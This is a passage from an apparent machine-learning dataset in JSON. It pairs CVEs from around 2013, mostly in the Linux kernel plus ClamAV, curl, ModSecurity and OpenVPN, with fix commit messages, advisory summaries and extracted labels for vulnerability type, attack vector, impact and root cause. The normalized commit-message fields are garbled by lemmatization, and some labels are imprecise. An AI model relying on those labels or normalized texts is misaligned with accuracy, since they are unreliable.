the CBC mode cipher.","commit_message_1":"use constant time memcmp when comparing hmacs in openvpn_decrypt","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a timing attack involving an hmac comparison function that does not run in constant time and a padding oracle attack on the cbc mode cipher","Impact":"obtain sensitive information","Root Cause":"caused by the use of non-constant-time memcmp","Attack Type":"remote attacker"},{"commit_id":"929473ea05db455ad88cdc081f2adc556b8dc48f","cve_id":"CVE-2013-2058","cwe_id":"CWE-119","commit_message":"usb: chipidea: Allow disabling streaming not only in udc mode\n\nWhen running a scp transfer using a USB\/Ethernet adapter the following crash\nhappens:\n\n$ scp test.tar.gz fabio@192.168.1.100:\/home\/fabio\nfabio@192.168.1.100's password:\ntest.tar.gz                                      0%    0     0.0KB\/s   --:-- ETA\n------------[ cut here ]------------\nWARNING: at net\/sched\/sch_generic.c:255 dev_watchdog+0x2cc\/0x2f0()\nNETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed out\nModules linked in:\nBacktrace:\n[<80011c94>] (dump_backtrace+0x0\/0x10c) from [<804d3a5c>] (dump_stack+0x18\/0x1c)\n r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0\n[<804d3a44>] (dump_stack+0x0\/0x1c) from [<80021868>]\n(warn_slowpath_common+0x54\/0x6c)\n[<80021814>] (warn_slowpath_common+0x0\/0x6c) from [<80021924>]\n(warn_slowpath_fmt+0x38\/0x40)\n...\n\nSetting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.\n\nHowever, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode,\nso allow disabling streaming also in host mode.\n\nTested on a mx6qsabrelite board.\n\nSuggested-by: Peter Chen <peter.chen@freescale.com>\nSigned-off-by: Fabio Estevam <fabio.estevam@freescale.com>\nReviewed-by: Peter Chen <peter.chen@freescale.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The host_start function in drivers\/usb\/chipidea\/host.c in the Linux kernel before 3.7.4 does not properly support a certain non-streaming option, which allows local users to cause a denial of service (system crash) by sending a large amount of network traffic through a USB\/Ethernet adapter.","commit_message_1":"chipidea : allow disabling streaming not only in udc mode when running a scp transfer using a usb\/ethernet adapter the following crash happens : $ scp <file>","Vulnerability Type":"buffer overflow","Attack Vector":"by sending a large amount of network traffic through a usb \/ ethernet adapter","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly support a certain non - streaming option","Attack Type":"local attacker"},{"commit_id":"24ff855c82d3f5c62bc5788a5776cefbffce2971","cve_id":"CVE-2013-2021","cwe_id":"CWE-119","commit_message":"pdf: bb #7053","summary":"pdf.c in ClamAV 0.97.1 through 0.97.7 allows remote attackers to cause a denial of service (out-of-bounds-read) via a crafted length value in an encrypted PDF file.","commit_message_1":"pdf : bb # <number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted length value in an encrypted pdf file","Impact":"cause a denial of service ( out - of - bounds - read )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"270e368b99e93aa5447d46c797c92c3f9f39f375","cve_id":"CVE-2013-2020","cwe_id":"CWE-189","commit_message":"libclamav: bb #7055","summary":"Integer underflow in the cli_scanpe function in pe.c in ClamAV before 0.97.8 allows remote attackers to cause a denial of service (crash) via a skewed offset larger than the size of the PE section in a UPX packed executable, which triggers an out-of-bounds read.","commit_message_1":"libclamav : bb # <number>","Vulnerability Type":"integer underflow","Attack Vector":"via a skewed offset larger than the size of the pe section in a upx packed executable , which triggers an out - of - bounds read","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an integer underflow","Attack Type":"remote attacker"},{"commit_id":"6ec82562ffc6f297d0de36d65776cff8e5704867","cve_id":"CVE-2013-2017","cwe_id":"CWE-399","commit_message":"veth: Dont kfree_skb() after dev_forward_skb()\n\nIn case of congestion, netif_rx() frees the skb, so we must assume\ndev_forward_skb() also consume skb.\n\nBug introduced by commit 445409602c092\n(veth: move loopback logic to common location)\n\nWe must change dev_forward_skb() to always consume skb, and veth to not\ndouble free it.\n\nBug report : http:\/\/marc.info\/?l=linux-netdev&m=127310770900442&w=3\n\nReported-by: Mart\u00edn Ferrari <martin.ferrari@gmail.com>\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The veth (aka virtual Ethernet) driver in the Linux kernel before 2.6.34 does not properly manage skbs during congestion, which allows remote attackers to cause a denial of service (system crash) by leveraging lack of skb consumption in conjunction with a double-free error.","commit_message_1":"dont kfree_skb ( ) after dev_forward_skb ( ) in case of congestion , netif_rx ( ) free the skb , so we must assume dev_forward_skb ( ) also consume skb","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging lack of skb consumption in conjunction with a double - free error","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly manage skbs during congestion","Attack Type":"remote attacker"},{"commit_id":"0e9a9a1ad619e7e987815d20262d36a2f95717ca","cve_id":"CVE-2013-2015","cwe_id":"CWE-399","commit_message":"ext4: avoid hang when mounting non-journal filesystems with orphan list\n\nWhen trying to mount a file system which does not contain a journal,\nbut which does have a orphan list containing an inode which needs to\nbe truncated, the mount call with hang forever in\next4_orphan_cleanup() because ext4_orphan_del() will return\nimmediately without removing the inode from the orphan list, leading\nto an uninterruptible loop in kernel code which will busy out one of\nthe CPU's on the system.\n\nThis can be trivially reproduced by trying to mount the file system\nfound in tests\/f_orphan_extents_inode\/image.gz from the e2fsprogs\nsource tree.  If a malicious user were to put this on a USB stick, and\nmount it on a Linux desktop which has automatic mounts enabled, this\ncould be considered a potential denial of service attack.  (Not a big\ndeal in practice, but professional paranoids worry about such things,\nand have even been known to allocate CVE numbers for such problems.)\n\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nReviewed-by: Zheng Liu <wenqing.lz@taobao.com>\nCc: stable@vger.kernel.org","summary":"The ext4_orphan_del function in fs\/ext4\/namei.c in the Linux kernel before 3.7.3 does not properly handle orphan-list entries for non-journal filesystems, which allows physically proximate attackers to cause a denial of service (system hang) via a crafted filesystem on removable media, as demonstrated by the e2fsprogs tests\/f_orphan_extents_inode\/image.gz test.","commit_message_1":"avoid hang when mounting non-journal filesystems with orphan list when trying to mount a file system which doe not contain a journal , but which doe have a orphan list containing an inode which need to be truncated , the mount call with hang forever in ext4_orphan_cleanup ( ) because ext4_orphan_del ( ) will return immediately without removing the inode from the orphan list , leading to an uninterruptible loop in kernel code which will busy out one of the cpu 's on the system","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted filesystem on removable media , as demonstrated by the e2fsprogs tests \/ f _ orphan _ extents _ inode \/ image . gz test ","Impact":"cause a denial of service ( system hang )","Root Cause":"does not properly handle orphan - list entries for non - journal filesystems","Attack Type":"local attacker"},{"commit_id":"83f1b4ba917db5dc5a061a44b3403ddb6e783494","cve_id":"CVE-2013-1979","cwe_id":"CWE-264","commit_message":"net: fix incorrect credentials passing\n\nCommit 257b5358b32f (\"scm: Capture the full credentials of the scm\nsender\") changed the credentials passing code to pass in the effective\nuid\/gid instead of the real uid\/gid.\n\nObviously this doesn't matter most of the time (since normally they are\nthe same), but it results in differences for suid binaries when the wrong\nuid\/gid ends up being used.\n\nThis just undoes that (presumably unintentional) part of the commit.\n\nReported-by: Andy Lutomirski <luto@amacapital.net>\nCc: Eric W. Biederman <ebiederm@xmission.com>\nCc: Serge E. Hallyn <serge@hallyn.com>\nCc: David S. Miller <davem@davemloft.net>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The scm_set_cred function in include\/net\/scm.h in the Linux kernel before 3.8.11 uses incorrect uid and gid values during credentials passing, which allows local users to gain privileges via a crafted application.","commit_message_1":"fix incorrect credential passing commit 257b5358b32f ( `` scm : capture the full credential of the scm sender '' ) changed the credential passing code to pas in the effective uid\/gid instead of the real uid\/gid","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application","Impact":"gain privileges","Root Cause":"uses incorrect uid and gid values during credentials passing","Attack Type":"local attacker"},{"commit_id":"6708075f104c3c9b04b23336bb0366ca30c3931b","cve_id":"CVE-2013-1959","cwe_id":"CWE-264","commit_message":"userns: Don't let unprivileged users trick privileged users into setting the id_map\n\nWhen we require privilege for setting \/proc\/<pid>\/uid_map or\n\/proc\/<pid>\/gid_map no longer allow an unprivileged user to\nopen the file and pass it to a privileged program to write\nto the file.\n\nInstead when privilege is required require both the opener and the\nwriter to have the necessary capabilities.\n\nI have tested this code and verified that setting \/proc\/<pid>\/uid_map\nfails when an unprivileged user opens the file and a privielged user\nattempts to set the mapping, that unprivileged users can still map\ntheir own id, and that a privileged users can still setup an arbitrary\nmapping.\n\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>","summary":"kernel\/user_namespace.c in the Linux kernel before 3.8.9 does not have appropriate capability requirements for the uid_map and gid_map files, which allows local users to gain privileges by opening a file within an unprivileged process and then modifying the file within a privileged process.","commit_message_1":"do n't let unprivileged user trick privileged user into setting the id_map when we require privilege for setting \/proc\/ < pid > \/uid_map or \/proc\/ < pid > \/gid_map no longer allow an unprivileged user to open the file and pas it to a privileged program to write to the file","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by opening a file within an unprivileged process and then modifying the file within a privileged process","Impact":"gain privileges","Root Cause":"does not have appropriate capability requirements for the uid _ map and gid _ map files","Attack Type":"local attacker"},{"commit_id":"92f28d973cce45ef5823209aab3138eb45d8b349","cve_id":"CVE-2013-1958","cwe_id":"CWE-264","commit_message":"scm: Require CAP_SYS_ADMIN over the current pidns to spoof pids.\n\nDon't allow spoofing pids over unix domain sockets in the corner\ncases where a user has created a user namespace but has not yet\ncreated a pid namespace.\n\nCc: stable@vger.kernel.org\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"The scm_check_creds function in net\/core\/scm.c in the Linux kernel before 3.8.6 does not properly enforce capability requirements for controlling the PID value associated with a UNIX domain socket, which allows local users to bypass intended access restrictions by leveraging the time interval during which a user namespace has been created but a PID namespace has not been created.","commit_message_1":"require cap_sys_admin over the current pidns to spoof pid","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging the time interval during which a user namespace has been created but a pid namespace has not been created","Impact":"bypass intended access restrictions","Root Cause":"does not properly enforce capability requirements for controlling the pid value associated with a unix domain socket","Attack Type":"local attacker"},{"commit_id":"132c94e31b8bca8ea921f9f96a57d684fa4ae0a9","cve_id":"CVE-2013-1957","cwe_id":"CWE-264","commit_message":"vfs: Carefully propogate mounts across user namespaces\n\nAs a matter of policy MNT_READONLY should not be changable if the\noriginal mounter had more privileges than creator of the mount\nnamespace.\n\nAdd the flag CL_UNPRIVILEGED to note when we are copying a mount from\na mount namespace that requires more privileges to a mount namespace\nthat requires fewer privileges.\n\nWhen the CL_UNPRIVILEGED flag is set cause clone_mnt to set MNT_NO_REMOUNT\nif any of the mnt flags that should never be changed are set.\n\nThis protects both mount propagation and the initial creation of a less\nprivileged mount namespace.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"The clone_mnt function in fs\/namespace.c in the Linux kernel before 3.8.6 does not properly restrict changes to the MNT_READONLY flag, which allows local users to bypass an intended read-only property of a filesystem by leveraging a separate mount namespace.","commit_message_1":"carefully propogate mount across user namespaces a a matter of policy mnt_readonly should not be changable if the original mounter had more privilege than creator of the mount namespace","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by leveraging a separate mount namespace","Impact":"bypass an intended read - only property of a filesystem","Root Cause":"does not properly restrict changes to the mnt _ readonly flag","Attack Type":"local attacker"},{"commit_id":"3151527ee007b73a0ebd296010f1c0454a919c7d","cve_id":"CVE-2013-1956","cwe_id":"CWE-264","commit_message":"userns:  Don't allow creation if the user is chrooted\n\nGuarantee that the policy of which files may be access that is\nestablished by setting the root directory will not be violated\nby user namespaces by verifying that the root directory points\nto the root of the mount namespace at the time of user namespace\ncreation.\n\nChanging the root is a privileged operation, and as a matter of policy\nit serves to limit unprivileged processes to files below the current\nroot directory.\n\nFor reasons of simplicity and comprehensibility the privilege to\nchange the root directory is gated solely on the CAP_SYS_CHROOT\ncapability in the user namespace.  Therefore when creating a user\nnamespace we must ensure that the policy of which files may be access\ncan not be violated by changing the root directory.\n\nAnyone who runs a processes in a chroot and would like to use user\nnamespace can setup the same view of filesystems with a mount\nnamespace instead.  With this result that this is not a practical\nlimitation for using user namespaces.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"The create_user_ns function in kernel\/user_namespace.c in the Linux kernel before 3.8.6 does not check whether a chroot directory exists that differs from the namespace root directory, which allows local users to bypass intended filesystem restrictions via a crafted clone system call.","commit_message_1":"do n't allow creation if the user is chrooted guarantee that the policy of which file may be access that is established by setting the root directory will not be violated by user namespaces by verifying that the root directory point to the root of the mount namespace at the time of user namespace creation","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted clone system call","Impact":"bypass intended filesystem restrictions","Root Cause":"does not check whether a chroot directory exists that differs from the namespace root directory ","Attack Type":"local attacker"},{"commit_id":"2eb8dcf26cb37f09cffe26909a646e702dbcab66","cve_id":"CVE-2013-1944","cwe_id":"CWE-200","commit_message":"cookie: fix tailmatching to prevent cross-domain leakage\n\nCookies set for 'example.com' could accidentaly also be sent by libcurl\nto the 'bexample.com' (ie with a prefix to the first domain name).\n\nThis is a security vulnerabilty, CVE-2013-1944.\n\nBug: http:\/\/curl.haxx.se\/docs\/adv_20130412.html","summary":"The tailMatch function in cookie.c in cURL and libcurl before 7.30.0 does not properly match the path domain when sending cookies, which allows remote attackers to steal cookies via a matching suffix in the domain of a URL.","commit_message_1":"fix tailmatching to prevent cross-domain leakage cooky set for '<file> ' could accidentaly also be sent by libcurl to the '<file> ' ( ie with a prefix to the first domain name )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a matching suffix in the domain of a url","Impact":"steal cookies","Root Cause":"does not properly match the path domain when sending cookies","Attack Type":"remote attacker"},{"commit_id":"fa3d315a4ce2c0891cdde262562e710d95fba19e","cve_id":"CVE-2013-1943","cwe_id":"CWE-20","commit_message":"KVM: Validate userspace_addr of memslot when registered\n\nThis way, we can avoid checking the user space address many times when\nwe read the guest memory.\n\nAlthough we can do the same for write if we check which slots are\nwritable, we do not care write now: reading the guest memory happens\nmore often than writing.\n\n[avi: change VERIFY_READ to VERIFY_WRITE]\n\nSigned-off-by: Takuya Yoshikawa <yoshikawa.takuya@oss.ntt.co.jp>\nSigned-off-by: Avi Kivity <avi@redhat.com>","summary":"The KVM subsystem in the Linux kernel before 3.0 does not check whether kernel addresses are specified during allocation of memory slots for use in a guest's physical address space, which allows local users to gain privileges or obtain sensitive information from kernel memory via a crafted application, related to arch\/x86\/kvm\/paging_tmpl.h and virt\/kvm\/kvm_main.c.","commit_message_1":"validate userspace_addr of memslot when registered this way , we can avoid checking the user space address many time when we read the guest memory","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application , related to arch \/ x86 \/ kvm \/ paging _ tmpl . h and virt \/ kvm \/ kvm _ main . c","Impact":"gain privileges or obtain sensitive information from kernel memory","Root Cause":"does not check whether kernel addresses are specified during allocation of memory slots for use","Attack Type":"local attacker"},{"commit_id":"715230a44310a8cf66fbfb5a46f9a62a9b2de424","cve_id":"CVE-2013-1929","cwe_id":"CWE-119","commit_message":"tg3: fix length overflow in VPD firmware parsing\n\nCommit 184b89044fb6e2a74611dafa69b1dce0d98612c6 (\"tg3: Use VPD fw version\nwhen present\") introduced VPD parsing that contained a potential length\noverflow.\n\nLimit the hardware's reported firmware string length (max 255 bytes) to\nstay inside the driver's firmware string length (32 bytes). On overflow,\ntruncate the formatted firmware string instead of potentially overwriting\nportions of the tg3 struct.\n\nhttp:\/\/cansecwest.com\/slides\/2013\/PrivateCore%20CSW%202013.pdf\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nReported-by: Oded Horovitz <oded@privatecore.com>\nReported-by: Brad Spengler <spender@grsecurity.net>\nCc: stable@vger.kernel.org\nCc: Matt Carlson <mcarlson@broadcom.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Heap-based buffer overflow in the tg3_read_vpd function in drivers\/net\/ethernet\/broadcom\/tg3.c in the Linux kernel before 3.8.6 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via crafted firmware that specifies a long string in the Vital Product Data (VPD) data structure.","commit_message_1":"fix length overflow in vpd firmware parsing commit 184b89044fb6e2a74611dafa69b1dce0d98612c6 ( `` tg3 : use vpd fw version when present '' ) introduced vpd parsing that contained a potential length overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted firmware that specifies a long string in the vital product data ( vpd ) data structure","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"12176503366885edd542389eed3aaf94be163fdb","cve_id":"CVE-2013-1928","cwe_id":"CWE-200","commit_message":"fs\/compat_ioctl.c: VIDEO_SET_SPU_PALETTE missing error check\n\nThe compat ioctl for VIDEO_SET_SPU_PALETTE was missing an error check\nwhile converting ioctl arguments.  This could lead to leaking kernel\nstack contents into userspace.\n\nPatch extracted from existing fix in grsecurity.\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: David Miller <davem@davemloft.net>\nCc: Brad Spengler <spender@grsecurity.net>\nCc: PaX Team <pageexec@freemail.hu>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The do_video_set_spu_palette function in fs\/compat_ioctl.c in the Linux kernel before 3.6.5 on unspecified architectures lacks a certain error check, which might allow local users to obtain sensitive information from kernel stack memory via a crafted VIDEO_SET_SPU_PALETTE ioctl call on a \/dev\/dvb device.","commit_message_1":"video_set_spu_palette missing error check the compat ioctl for video_set_spu_palette wa missing an error check while converting ioctl argument","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted video _ set _ spu _ palette ioctl call on a \/ dev \/ dvb device","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"lacks a certain error check","Attack Type":"local attacker"},{"commit_id":"d4d80b38aa85eccb26e3c61b04d16e8ca5de76fe","cve_id":"CVE-2013-1915","cwe_id":"CWE-20","commit_message":"Added SecXmlExternalEntity","summary":"ModSecurity before 2.7.3 allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service (CPU and memory consumption) via an XML external entity declaration in conjunction with an entity reference, aka an XML External Entity (XXE) vulnerability.","commit_message_1":"added secxmlexternalentity","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an xml external entity declaration in conjunction with an entity reference , aka an xml external entity ( xxe ) vulnerability ","Impact":"read arbitrary files , send http requests to intranet servers , or cause a denial of service ( cpu and memory consumption )","Root Cause":"caused by an error when parsing external XML entities","Attack Type":"remote attacker"},{"commit_id":"c0f5ecee4e741667b2493c742b60b6218d40b3aa","cve_id":"CVE-2013-1860","cwe_id":"CWE-119","commit_message":"USB: cdc-wdm: fix buffer overflow\n\nThe buffer for responses must not overflow.\nIf this would happen, set a flag, drop the data and return\nan error after user space has read all remaining data.\n\nSigned-off-by: Oliver Neukum <oliver@neukum.org>\nCC: stable@kernel.org\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Heap-based buffer overflow in the wdm_in_callback function in drivers\/usb\/class\/cdc-wdm.c in the Linux kernel before 3.8.4 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted cdc-wdm USB device.","commit_message_1":"cdc-wdm : fix buffer overflow the buffer for response must not overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted cdc - wdm usb device ","Impact":"cause a denial of service ( system crash ) or possibly execute arbitrary code","Root Cause":"Heap-based buffer overflow","Attack Type":"local attacker"},{"commit_id":"e66eded8309ebf679d3d3c1f5820d1f2ca332c71","cve_id":"CVE-2013-1858","cwe_id":"CWE-264","commit_message":"userns: Don't allow CLONE_NEWUSER | CLONE_FS\n\nDon't allowing sharing the root directory with processes in a\ndifferent user namespace.  There doesn't seem to be any point, and to\nallow it would require the overhead of putting a user namespace\nreference in fs_struct (for permission checks) and incrementing that\nreference count on practically every call to fork.\n\nSo just perform the inexpensive test of forbidding sharing fs_struct\nacrosss processes in different user namespaces.  We already disallow\nother forms of threading when unsharing a user namespace so this\nshould be no real burden in practice.\n\nThis updates setns, clone, and unshare to disallow multiple user\nnamespaces sharing an fs_struct.\n\nCc: stable@vger.kernel.org\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The clone system-call implementation in the Linux kernel before 3.8.3 does not properly handle a combination of the CLONE_NEWUSER and CLONE_FS flags, which allows local users to gain privileges by calling chroot and leveraging the sharing of the \/ directory between a parent process and a child process.","commit_message_1":"do n't allow clone_newuser | clone_fs do n't allowing sharing the root directory with process in a different user namespace","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by calling chroot and leveraging the sharing of the \/ directory between a parent process and a child process","Impact":"gain privileges","Root Cause":"does not properly handle a combination of the clone _ newuser and clone _ fs flags","Attack Type":"local attacker"},{"commit_id":"8d0c2d10dd72c5292eda7a06231056a4c972e4cc","cve_id":"CVE-2013-1848","cwe_id":"CWE-20","commit_message":"ext3: Fix format string issues\n\next3_msg() takes the printk prefix as the second parameter and the\nformat string as the third parameter. Two callers of ext3_msg omit the\nprefix and pass the format string as the second parameter and the first\nparameter to the format string as the third parameter. In both cases\nthis string comes from an arbitrary source. Which means the string may\ncontain format string characters, which will\nlead to undefined and potentially harmful behavior.\n\nThe issue was introduced in commit 4cf46b67eb(\"ext3: Unify log messages\nin ext3\") and is fixed by this patch.\n\nCC: stable@vger.kernel.org\nSigned-off-by: Lars-Peter Clausen <lars@metafoo.de>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"fs\/ext3\/super.c in the Linux kernel before 3.8.4 uses incorrect arguments to functions in certain circumstances related to printk input, which allows local users to conduct format-string attacks and possibly gain privileges via a crafted application.","commit_message_1":"fix format string issue ext3_msg ( ) take the printk prefix a the second parameter and the format string a the third parameter","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"conduct format - string attacks and possibly gain privileges","Root Cause":"uses incorrect arguments to functions","Attack Type":"local attacker"},{"commit_id":"726bc6b092da4c093eb74d13c07184b18c1af0f1","cve_id":"CVE-2013-1828","cwe_id":"CWE-20","commit_message":"net\/sctp: Validate parameter size for SCTP_GET_ASSOC_STATS\n\nBuilding sctp may fail with:\n\nIn function \u2018copy_from_user\u2019,\n    inlined from \u2018sctp_getsockopt_assoc_stats\u2019 at\n    net\/sctp\/socket.c:5656:20:\narch\/x86\/include\/asm\/uaccess_32.h:211:26: error: call to\n    \u2018copy_from_user_overflow\u2019 declared with attribute error: copy_from_user()\n    buffer size is not provably correct\n\nif built with W=1 due to a missing parameter size validation\nbefore the call to copy_from_user.\n\nSigned-off-by: Guenter Roeck <linux@roeck-us.net>\nAcked-by: Vlad Yasevich <vyasevich@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_getsockopt_assoc_stats function in net\/sctp\/socket.c in the Linux kernel before 3.8.4 does not validate a size value before proceeding to a copy_from_user operation, which allows local users to gain privileges via a crafted application that contains an SCTP_GET_ASSOC_STATS getsockopt system call.","commit_message_1":"validate parameter size for sctp_get_assoc_stats building sctp may fail with : in function \u2018 copy_from_user \u2019 , inlined from \u2018 sctp_getsockopt_assoc_stats \u2019 at net\/sctp\/<file> : <number> : <number> : arch\/x86\/include\/asm\/<file> : <number> : <number> : error : call to \u2018 copy_from_user_overflow \u2019 declared with attribute error : copy_from_user ( ) buffer size is not provably correct if built with w=<number> due to a missing parameter size validation before the call to copy_from_user","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application that contains an sctp _ get _ assoc _ stats getsockopt system call","Impact":"gain privileges","Root Cause":"does not validate a size value before proceeding to a copy _ from _ user operation","Attack Type":"local attacker"},{"commit_id":"276bdb82dedb290511467a5a4fdbe9f0b52dce6f","cve_id":"CVE-2013-1827","cwe_id":null,"commit_message":"dccp: check ccid before dereferencing\n\nccid_hc_rx_getsockopt() and ccid_hc_tx_getsockopt() might be called with\na NULL ccid pointer leading to a NULL pointer dereference. This could\nlead to a privilege escalation if the attacker is able to map page 0 and\nprepare it with a fake ccid_ops pointer.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Gerrit Renker <gerrit@erg.abdn.ac.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/dccp\/ccid.h in the Linux kernel before 3.5.4 allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) by leveraging the CAP_NET_ADMIN capability for a certain (1) sender or (2) receiver getsockopt call.","commit_message_1":"check ccid before dereferencing ccid_hc_rx_getsockopt ( ) and ccid_hc_tx_getsockopt ( ) might be called with a null ccid pointer leading to a null pointer dereference","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging the cap _ net _ admin capability for a certain ( 1 ) sender or ( 2 ) receiver getsockopt call","Impact":"gain privileges or cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference while accessing socket options of dccp_sock objects","Attack Type":"local attacker"},{"commit_id":"864745d291b5ba80ea0bd0edcbe67273de368836","cve_id":"CVE-2013-1826","cwe_id":null,"commit_message":"xfrm_user: return error pointer instead of NULL\n\nWhen dump_one_state() returns an error, e.g. because of a too small\nbuffer to dump the whole xfrm state, xfrm_state_netlink() returns NULL\ninstead of an error pointer. But its callers expect an error pointer\nand therefore continue to operate on a NULL skbuff.\n\nThis could lead to a privilege escalation (execution of user code in\nkernel context) if the attacker has CAP_NET_ADMIN and is able to map\naddress 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Steffen Klassert <steffen.klassert@secunet.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The xfrm_state_netlink function in net\/xfrm\/xfrm_user.c in the Linux kernel before 3.5.7 does not properly handle error conditions in dump_one_state function calls, which allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) by leveraging the CAP_NET_ADMIN capability.","commit_message_1":"return error pointer instead of null when dump_one_state ( ) return an error , <file>","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging the cap _ net _ admin capability","Impact":"gain privileges or cause a denial of service ( pointer dereference and system crash )","Root Cause":"does not properly handle error conditions","Attack Type":"local attacker"},{"commit_id":"eb178619f930fa2ba2348de332a1ff1c66a31424","cve_id":"CVE-2013-1819","cwe_id":"CWE-20","commit_message":"xfs: fix _xfs_buf_find oops on blocks beyond the filesystem end\n\nWhen _xfs_buf_find is passed an out of range address, it will fail\nto find a relevant struct xfs_perag and oops with a null\ndereference. This can happen when trying to walk a filesystem with a\nmetadata inode that has a partially corrupted extent map (i.e. the\nblock number returned is corrupt, but is otherwise intact) and we\ntry to read from the corrupted block address.\n\nIn this case, just fail the lookup. If it is readahead being issued,\nit will simply not be done, but if it is real read that fails we\nwill get an error being reported.  Ideally this case should result\nin an EFSCORRUPTED error being reported, but we cannot return an\nerror through xfs_buf_read() or xfs_buf_get() so this lookup failure\nmay result in ENOMEM or EIO errors being reported instead.\n\nSigned-off-by: Dave Chinner <dchinner@redhat.com>\nReviewed-by: Brian Foster <bfoster@redhat.com>\nReviewed-by: Ben Myers <bpm@sgi.com>\nSigned-off-by: Ben Myers <bpm@sgi.com>","summary":"The _xfs_buf_find function in fs\/xfs\/xfs_buf.c in the Linux kernel before 3.7.6 does not validate block numbers, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by leveraging the ability to mount an XFS filesystem containing a metadata inode with an invalid extent map.","commit_message_1":"fix _xfs_buf_find oops on block beyond the filesystem end when _xfs_buf_find is passed an out of range address , it will fail to find a relevant struct xfs_perag and oops with a null dereference","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging the ability to mount an xfs filesystem containing a metadata inode with an invalid extent map","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"does not validate block numbers","Attack Type":"local attacker"},{"commit_id":"a2c118bfab8bc6b8bb213abfc35201e441693d55","cve_id":"CVE-2013-1798","cwe_id":"CWE-20","commit_message":"KVM: Fix bounds checking in ioapic indirect register reads (CVE-2013-1798)\n\nIf the guest specifies a IOAPIC_REG_SELECT with an invalid value and follows\nthat with a read of the IOAPIC_REG_WINDOW KVM does not properly validate\nthat request.  ioapic_read_indirect contains an\nASSERT(redir_index < IOAPIC_NUM_PINS), but the ASSERT has no effect in\nnon-debug builds.  In recent kernels this allows a guest to cause a kernel\noops by reading invalid memory.  In older kernels (pre-3.3) this allows a\nguest to read from large ranges of host memory.\n\nTested: tested against apic unit tests.\n\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Marcelo 